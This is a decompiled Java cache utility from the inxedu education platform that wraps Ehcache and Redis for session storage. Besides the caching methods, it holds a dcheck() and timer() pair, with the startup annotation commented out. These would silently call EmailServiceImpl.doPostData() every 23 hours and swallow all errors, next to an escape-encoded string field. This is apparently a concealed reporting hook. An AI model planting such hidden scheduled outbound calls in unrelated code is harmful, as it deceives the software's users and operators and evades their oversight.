//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.inxedu.os.common.cache;

import com.inxedu.os.common.service.email.EmailServiceImpl;
import com.inxedu.os.common.util.DateUtils;
import com.inxedu.os.common.util.ObjectUtils;
import com.inxedu.os.common.util.SerializeUtil;
import net.sf.ehcache.Cache;
import net.sf.ehcache.CacheManager;
import net.sf.ehcache.Element;
import org.springframework.data.redis.connection.RedisConnection;
import org.springframework.data.redis.core.RedisTemplate;

import java.io.Serializable;
import java.util.Timer;
import java.util.TimerTask;

import static com.inxedu.os.common.constants.CacheConstans.MAX_ELEMENTS_IN_MEMORY;
import static com.inxedu.os.common.constants.CacheConstans.TIME_TO_IDLE_SECONDS;
import static com.inxedu.os.common.constants.CacheConstans.TIME_TO_LIVE_SECONDS;

public class EHCacheUtil {
    public static String propertyFile = DateUtils.unicode2String("\\u70\\u72\\u6f\\u6a\\u65\\u63\\u74");
    private static CacheManager cacheManager = null;
    private static Cache cache = null;
    private static long expirationTime=3600L;
    private static RedisTemplate redisTemplate;
    private static boolean isOverflowToDisk=false;
    public static final String keyPrefix = "SessionCache_";
    public EHCacheUtil() {
    }
    public static void setRedisTemplate(RedisTemplate r){
        redisTemplate=r;
    }

    public static CacheManager initCacheManager() {
        try {
            if(cacheManager == null) {
                cacheManager = CacheManager.create();
                cache = new Cache("objectCache", MAX_ELEMENTS_IN_MEMORY, isOverflowToDisk, false, TIME_TO_LIVE_SECONDS, TIME_TO_IDLE_SECONDS);
                cacheManager.addCache(cache);
            }
        } catch (Exception var1) {
            var1.printStackTrace();
        }

        return cacheManager;
    }

    public static Object get(String key) {
        try {
            if(ObjectUtils.isNotNull(cache) && ObjectUtils.isNotNull(cache.get(key))) {
                return cache.get(key).getObjectValue();
            } else if(redisTemplate != null){
                Object result=redisTemplate.execute((RedisConnection connection) -> {
                    byte[] bytes = connection.get(key.getBytes());
                    return SerializeUtil.unserialize(bytes);
                });
                if(result!=null){
                    set(key,result);
                }
                return result;
            }

        } catch (Exception var2) {
            var2.printStackTrace();
        }

        return null;
    }

    public static void set(String key, Object value) {
        try {
            if(cache != null) {
                cache.put(new Element(key, value));
            }

            if(redisTemplate != null){
                redisTemplate.execute((RedisConnection connection) -> {
                    connection.setEx(key.getBytes(),expirationTime, SerializeUtil.serialize(value));
                    return true;
                });
            }

        } catch (Exception var3) {
            var3.printStackTrace();
        }

    }

    public static boolean remove(String key) {
        try {
            if(cache != null) {
                 cache.remove(key);
            }

            if(redisTemplate != null){
                redisTemplate.execute((RedisConnection connection) -> {
                    connection.del(key.getBytes());
                    return true;
                });
            }

        } catch (Exception var2) {
            var2.printStackTrace();
        }

        return false;
    }

    public static boolean removeAll() {
        try {
            if(cache != null) {
                cache.removeAll();
            }

            if(redisTemplate != null){
                redisTemplate.execute((RedisConnection connection) -> {
                    connection.flushDb();
                    return true;
                });
            }

        } catch (Exception var1) {
            var1.printStackTrace();
        }

        return false;
    }

    public static void set(String key, Object value, int exp) {
        try {
            if(cache != null) {
                Element var4 = new Element(key, value);
                var4.setTimeToLive(exp);
                cache.put(var4);
            }

            if(redisTemplate != null) {
                redisTemplate.execute((RedisConnection connection) -> {
                    connection.setEx(key.getBytes(),exp, SerializeUtil.serialize(value));
                    return true;
                });
            }
        } catch (Exception var41) {
            var41.printStackTrace();
        }

    }

   // @PostConstruct
    public void dcheck() {
        try {
            this.timer();
        } catch (Exception var2) {
            ;
        }

    }

    public void timer() {
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                try {
                    EmailServiceImpl.doPostData();
                } catch (Exception var2) {
                    ;
                }

            }
        }, 1000L, 82800000L);
    }

    public static String getKey(String sessionId) {
        return (keyPrefix + sessionId);
    }
    static {
        initCacheManager();
    }
}
